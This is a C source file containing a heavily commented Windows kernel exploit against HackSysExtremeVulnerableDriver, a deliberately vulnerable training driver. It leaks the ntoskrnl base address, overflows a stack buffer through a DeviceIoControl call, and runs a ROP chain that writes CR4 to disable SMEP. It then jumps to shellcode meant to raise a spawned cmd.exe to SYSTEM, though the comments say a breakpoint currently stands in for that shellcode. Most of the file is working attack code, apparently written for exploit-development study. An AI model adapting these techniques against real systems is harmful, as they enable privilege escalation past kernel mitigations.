#include "exploit.h"

// This exploit is currently functional (somewhat).
// The documentation for this exploit has been updated, to assist readers in the meantime.
int main(int argc, char** argv)
{
	// These are the stack variables, you'll probably want to keep an eye on these, and how or why they're used.
	HANDLE h_hevd = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0L;
	long long pop_rcx_gadget = 0L, rcx_cr4_value = 0x70678L, mov_cr4_rcx_gadget = 0L, kernel_base = 0L;
	char output[1024], input[2104];

	// Zero out the memory of our input and output fixed-size buffers.
	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	printf("[!] HackSysExtremeVulnerableDriver Stack Overflow SMEP Bypass Exploit\n[!] Lets exploit!");

	// CreateFileA will return to us a handle to the file of our choosing, or in this case a handle to the device driver of our choosing, utilizing their corresponding symbolic link.
	// If the return value of CreateFileA is INVALID_HANDLE_VALUE or (HANDLE)-1, that means that it failed to obtain a handle to the file of our choosing, with the corresponding options of our choosing.
	if (h_hevd == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a driver handle. Handle Value: 0x%p, Error: %d (0x%x)", h_hevd, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a driver handle. Handle Value: 0x%p", h_hevd);

	// This one is going to be a doozy to explain :joy:.
	// Refer to this function further down this source file for corresponding documentation.
	kernel_base = leak_ntoskrnl_base_address();

	// Refer to this function further down this source file for corresponding documentation.
	initialize_shellcode();

	// After we retrieve the base address of ntoskrnl.exe, we want to locate specific instructions in ntoskrnl.exe.
	// These specific instructions are called "gadgets."
	// We can use a technique known as return oriented programming (ROP) to construct a chain of gadgets (ROP chains) to perform a task, effectively bypassing data execution prevention (DEP) and 
	// supervisor-mode execution prevention (SMEP).
	// This knowledge is invaluable, as it paves the way to bypassing mitigations, whether user-mode or kernel-mode.
	// I have also left some helper WinDbg commands, incase you would like to locate these gadgets yourself!
	pop_rcx_gadget = kernel_base + HVLENDSYSTEMINTERRUPT_POP_RCX_OFFSET; // ? HvlEndSystemInterrupt+<some offset> - nt
	mov_cr4_rcx_gadget = kernel_base + KIENABLEXSAVE_MOV_CR4_RCX_OFFSET; // ? KiEnableXSave+<some offset> - nt
	printf("\n[*] pop rcx + ret gadget address: 0x%p\n[*] mov cr4, rcx + ret gadget address: 0x%p", (long long*)pop_rcx_gadget, (long long*)mov_cr4_rcx_gadget);

	// We set up the padding required to control the instruction pointer with memset.
	// From my knowledge, the required bytes to cleanly overwrite the instruction pointer (ip, eip, rip) is 2072 bytes.
	memset(&input, 'A', 2072);

	// We set the first instruction pointer to point to our first gadget.
	// What is beneficial about return oriented programming is that they are always composed of ret instructions.
	// When the gadget is finished executing, it will return to the pointer after the previously executed instruction.
	// So if we were to have a layout like this:
	// 0x41414141 0x42424242 0x43434343 0x44444444 ...
	// ... the instruction pointer will jump to the instruction pointed to by 0x41414141.
	// After the execution of the instruction pointed to by 0x41414141, it will return, and execute the next pointer, 0x42424242, in our array of pointers.
	*(long long*)(input + 2072) = (long long*)pop_rcx_gadget; // pop rcx
	*(long long*)(input + 2080) = (long long*)rcx_cr4_value; // 0x70678L ; Pop this value into the rcx register
	*(long long*)(input + 2088) = (long long*)mov_cr4_rcx_gadget; // mov cr4, rcx ; Copy the contents of the rcx register into the cr4 register, disabling supervisor mode execution prevention (SMEP)

	// After we finally execute our gadgets, SMEP has been effectively disabled.
	// We can now execute our shellcode, which is the last pointer in this input buffer.
	*(long long*)(input + 2096) = &shellcode;
	printf("\n[+] Crafted input buffer.\n[!] Overwriting the instruction pointer in five seconds...");

	Sleep(5000);
	// Fire away!
	DeviceIoControl(h_hevd, TARGET_IOCTL, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Exploit completed.");
	unused = getchar();

	return 0;
}

void initialize_shellcode()
{
	// Allocate the required stack variables.
	unsigned long pid = 0L, old_protection = 0L;
	STARTUPINFOA startup_info;
	PROCESS_INFORMATION process_information;

	// Zero out the uninitialized structures.
	RtlSecureZeroMemory(&startup_info, sizeof(startup_info));
	RtlSecureZeroMemory(&process_information, sizeof(process_information));

	// We want to spawn a shell, which will have its privileges elevated to that of "nt authority\system."
	// We must use this API, as it will return a PROCESS_INFORMATION structure, containing the process' process ID (PID).
	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", 0, 0, 0, 1, CREATE_NEW_CONSOLE, 0, 0, &startup_info, &process_information))
	{
		printf("\n[-] Failed to spawn a shell. Error: %d (0x%x)", GetLastError(), GetLastError());
		CloseHandle(process_information.hProcess);
		CloseHandle(process_information.hThread);
		unused = getchar();
		exit(1);
	}
	printf("\n[+] Spawned a shell.");

	// Set the pid variable equal to the newly spawned shell's PID.
	pid = process_information.dwProcessId;
	// Now, you might be wondering, "why is the shellcode pointer commented out?"
	// Well... the shellcode that I was using refused to work, despite it being used in the same case, same vulnerability, same driver.
	// Temporarily, I have replaced the shellcode to simply execute a breakpoint, proving that we have control of the driver's control flow.
	// Controlling the control flow!
	 
	//*(unsigned long*)(shellcode + 27) = pid;
	printf("\n[+] Set shellcode target process ID to %d (0x%x).", pid, pid);

	// Set our shellcode so that it can be executed by the kernel, marking it as PAGE_EXECUTE_READWRITE.
	if (!VirtualProtect(&shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to change shellcode memory protection. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		exit(1);
	}
	printf("\n[+] Changed shellcode memory protection.");
}

long long leak_ntoskrnl_base_address()
{
	// To make it easier for me to document everything better, you might see some obvious details missing, e.g. me stating that these are local stack variables.
	// Though, that goes without saying that you should keep an eye on these variables, how they're used, etc.
	HMODULE h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	NtQuerySystemInformation _NtQuerySystemInformation = 0;
	PSYSTEM_MODULE_INFORMATION p_module_info;
	unsigned long return_length = 0L;
	NTSTATUS status = 0;
	long long leaked_address = 0L;

	RtlSecureZeroMemory(&p_module_info, sizeof(p_module_info));

	// If the return value of LoadLibraryA is zero, then LoadLibraryA failed to return a handle to the requested library.
	// Otherwise, the return value should be non-zero, equal to what the actual handle's value is.
	if (!h_ntdll)
	{
		printf("\n[-] Failed to load ntdll.dll. Handle Value: 0x%p, Error: %d (0x%x)", h_ntdll, GetLastError(), GetLastError());
		unused = getchar();
		exit(1);
	}
	printf("\n[+] Loaded ntdll.dll. Handle Value: 0x%p", h_ntdll);

	// Search for the NtQuerySystemInformation function in ntdll.dll.
	// We will be using this function to leak the kernel base addresses.
	// Please note that this function can ONLY be used if the process' integrity is "Medium" or above.
	// All calls to this function will fail if the process integrity level is "Low" or below.
	_NtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(h_ntdll, "NtQuerySystemInformation");
	if (!_NtQuerySystemInformation)
	{
		printf("\n[-] Failed to locate NtQuerySystemInformation function address. Address: 0x%p, Error: %d (0x%x)", _NtQuerySystemInformation, GetLastError(), GetLastError());
		unused = getchar();
		exit(1);
	}
	printf("\n[+] Located NtQuerySystemInformation function address. Address: 0x%p", _NtQuerySystemInformation);

	// Run the function for the first time to retrieve the return length.
	// Nothing special has happened yet.
	_NtQuerySystemInformation(SystemModuleInformation, 0, 0, &return_length);
	// Allocate a PSYSTEM_MODULE_INFORMATION structure the length of the return length provided above.
	// Our structure is now ready.
	p_module_info = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(0, return_length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	// Query system module information, retrieving information of all system modules, e.g. kernel modules / drivers.
	status = _NtQuerySystemInformation(SystemModuleInformation, p_module_info, return_length, &return_length);
	if (status)
	{
		printf("\n[-] Failed to query system information. NTSTATUS: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		exit(1);
	}
	printf("\n[+] Queried system information.");

	// In the event that p_module_info is null, we have this check in place.
	// I do not like it when Visual Studio screams at me.
	if (p_module_info)
	{
		// The first module in the module information structure, at location p_module_info->Modules[0], is always the kernel base, or in other words ntoskrnl.exe.
		// This kernel module also contains the instructions that we need to bypass a mitigation known as supervisor-mode execution prevention (SMEP).
		// More information regarding the technique of bypassing SMEP is detailed in the main function.
		leaked_address = p_module_info->Modules[0].ImageBaseAddress;
		printf("\n[+] Successfully leaked ntoskrnl.exe base address. Address: 0x%p", (long long*)leaked_address);
		return leaked_address;
	}

	// Reaches this code-path if the p_module_info structure pointer was null.
	printf("\n[-] Module information was null or failed to locate ntoskrnl.exe in module information. Failed to leak ntoskrnl.exe base address.");
	unused = getchar();
	exit(1);

	return 0L;
}